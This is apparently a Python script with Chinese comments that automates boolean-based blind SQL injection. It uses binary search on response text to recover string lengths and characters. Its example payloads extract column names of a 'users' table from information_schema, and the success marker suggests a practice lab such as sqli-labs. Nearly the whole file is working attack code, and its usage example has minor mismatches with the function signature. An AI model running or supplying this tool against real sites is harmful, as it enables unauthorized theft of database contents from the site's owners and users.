"""
使用示例：
给出url和return_key
url = 'http://xxx.xxx.xxx.xxx/'
return_key = 'You are in'
给出请求头：（内容可为空）
headers = {
    'Authorization': 'Basic YWRtaW5lcjpjb2tlLmNvbS4='  # 身份验证，用户名和密码
}
给出两个参数：
payload_len = '''?id=-1' or length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'))>{}-- -'''
payload = '''?id=-1' or ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),{},1))>{}-- -'''
调用sql_len_to_content函数返回结果：
results = sql_len_to_content(header=headers, payload_lens=payload_len, payload_cons=payload)
print(results)
"""

import requests
import time


def sql_str_lens(header, url_lens, payload_lens, return_key_lens, max_len=99):
    # 探测字符串的长度
    # payload中需要包含一个{}来逐个尝试不同的长度
    # 爆破某字符串的长度，长度最大限制为99
    """
    # 顺序查找 从长度为1开始找起
    for len_i in range(1, max_len + 1):
        lens_res = requests.get(url + payload_lens.format(len_i), headers=header)
        if return_key in lens_res.text:
            return len_i
    """
    # 二分查找，范围是1~99
    if not max_len == 99 and return_key_lens in requests.get(url_lens + payload_lens.format(max_len + 1),
                                                             headers=header).text:
        return 'Too lang! (Length exceeds limit)'  # 太长了
    low = 1
    high = max_len + 1
    mid = (low + high) // 2
    while low < high:
        lens_res = requests.get(url_lens + payload_lens.format(mid), headers=header)
        if return_key_lens in lens_res.text:
            low = mid + 1
        else:
            high = mid

        mid = (low + high) // 2

    return mid


def sql_str_content(header, url_con, str_len_cont, payload_con, return_key_con, is_show=False, cut_len=99):
    # payload要有两个{}
    result_content = ''
    if not cut_len == 99:
        # 如果手动指定了“只爆破前多少位”，就进行下面的替换
        str_len_cont = cut_len

    # 二分查找
    for i in range(1, str_len_cont + 1):
        low = 32
        high = 128
        mid = (low + high) // 2

        while low < high:
            res = requests.get(url_con + payload_con.format(i, mid), headers=header)
            # time.sleep(0.2)

            if return_key_con in res.text:
                low = mid + 1
            else:
                high = mid

            mid = (low + high) // 2

        if mid == 32 or mid == 127:
            print('b')
            break

        result_content = result_content + chr(mid)

        if is_show:
            print(result_content)
        else:
            print('.', end='')
    print()
    return result_content


def sql_len_to_content(header, url, payload_lens, payload, return_key, max_lens=99, cut_len=99):
    # 进一步封装
    # cut_len用于 当字符串太长的时候，只爆破前多少位，其长度应小于或等于字符串长度
    str_len_big = sql_str_lens(header=header, url_lens=url, payload_lens=payload_lens, return_key_lens=return_key,
                               max_len=max_lens)

    if not cut_len == 99:  # 如果指定了长度
        if cut_len > str_len_big:  # 如果指定长度比实际长度更长，则指定的长度不合理
            return '给定的cut_len太大了，请换一个更小的或者移除该参数（探测长度为' + str(str_len_big) + ')'
        else:  # 指定的长度合理
            print('使用手动指定的长度：' + str(cut_len) + '。   注：探测到的长度：' + str(str_len_big))
    else:  # 没手动指定长度，探测到的长度为
        print('使用探测到的长度：' + str(str_len_big))

    result_big = sql_str_content(header=header, url_con=url, str_len_cont=str_len_big, payload_con=payload,
                                 return_key_con=return_key, cut_len=cut_len)
    return result_big
